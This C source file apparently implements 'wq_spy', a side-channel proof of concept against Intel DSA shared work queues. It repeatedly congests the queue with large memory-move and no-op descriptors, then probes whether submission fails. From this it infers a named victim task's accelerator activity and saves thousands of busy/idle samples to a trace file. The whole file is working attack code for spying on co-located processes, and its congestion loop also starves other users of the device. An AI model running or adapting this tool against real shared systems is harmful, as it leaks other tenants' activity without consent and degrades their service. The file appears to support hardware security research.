#include "dsa.h"

#define ATTACK_INTERVAL_NS 100
#define TRACE_BUFFER_SIZE 2000
#define XFER_SIZE (1L << 29)
#define WQ_SIZE 7

struct wq_info wq_info;
struct dsa_hw_desc noop = {}, mass[WQ_SIZE] = {}, noops[WQ_SIZE] = {};
struct dsa_completion_record comp __attribute__((aligned(32))) = {}, \
    mass_comp[WQ_SIZE] __attribute__((aligned(32))) = {}, \
    noops_comp[WQ_SIZE] __attribute__((aligned(32))) = {};
uint64_t detection_threshold;
uint8_t *src, *dst;

// traces
int trace_buffer[TRACE_BUFFER_SIZE];
int trace_index = 0;

static inline void congest() {
    mass_comp[0].status = 0;
    while (enqcmd(wq_info.wq_portal, &mass[0]));
    for(int i = 1; i < WQ_SIZE - 1; i++) {
        noops_comp[i].status = 0;
        if (enqcmd(wq_info.wq_portal, &noops[i]))
            printf("failed to enqueue noop %d\n", i);
    }
}

static inline int probe_swq() {
    comp.status = 0;
    return enqcmd(wq_info.wq_portal, &noop);
}

// Save traces to file
void save_traces(char* taskname) {
    char filename[256];
    snprintf(filename, sizeof(filename), "swq-%s-traces.txt", taskname);

    FILE* fp = fopen(filename, "w");
    if (!fp) {
        fprintf(stderr, "[wq_spy] Failed to open trace file\n");
        return;
    }
    
    for (int i = 0; i < trace_index; i++) 
        fprintf(fp, "%d\n", trace_buffer[i]);
    
    fclose(fp);
    printf("[wq_spy] Traces saved to %s\n", filename);
}

int main(int argc, char *argv[]) {
    char *taskname;
    if (argc == 2) {
        taskname = argv[1];
    } else {
        printf("Usage: %s [prog-to-spy]\n", argv[0]);
        return EXIT_FAILURE;
    }
    
    // Initialize work queue
    int rc = map_spec_wq(&wq_info, "/dev/dsa/wq2.0");
    if (rc) {
        fprintf(stderr, "[wq_spy] Failed to map work queue: %d\n", rc);
        return EXIT_FAILURE;
    }
    
    src = malloc(XFER_SIZE * sizeof(uint8_t));
    dst = malloc(XFER_SIZE * sizeof(uint8_t));
    memset(src, 0, XFER_SIZE * sizeof(uint8_t)); // no page fault
    memset(dst, 0, XFER_SIZE * sizeof(uint8_t));

    noop.opcode = DSA_OPCODE_NOOP;
    noop.flags = IDXD_OP_FLAG_CRAV | IDXD_OP_FLAG_RCR;
    noop.completion_addr = (uintptr_t) &comp;
    for (int i = 0; i < WQ_SIZE; i++) {
        mass[i].opcode = DSA_OPCODE_MEMMOVE;
        mass[i].flags = IDXD_OP_FLAG_CRAV | IDXD_OP_FLAG_RCR | IDXD_OP_FLAG_CC;
        mass[i].src_addr = (uintptr_t) src;
        mass[i].dst_addr = (uintptr_t) dst;
        mass[i].xfer_size = XFER_SIZE;
        mass_comp[i].status = 0;
        mass[i].completion_addr = (uintptr_t) &mass_comp[i];

        noops[i].opcode = DSA_OPCODE_NOOP;
        noops[i].flags = IDXD_OP_FLAG_CRAV | IDXD_OP_FLAG_RCR;
        noops[i].completion_addr = (uintptr_t) &noops_comp[i];
    }
    
    printf("[wq_spy] Spying on task: %s\n", taskname);

    // congest();
    // if (probe_swq()) printf("victim cannot submit\n"); // pretend someone submitted a job
    // nsleep(40000000);
    // printf("swq: %s\n", probe_swq() ? "busy" : "idle");

    while (trace_index < TRACE_BUFFER_SIZE) {
        congest();
        nsleep(40000000);
        // if (probe_swq()) printf("[wq_spy] detected\n");
        trace_buffer[trace_index++] = probe_swq();
    }
    
    save_traces(taskname);

    return EXIT_SUCCESS;
}
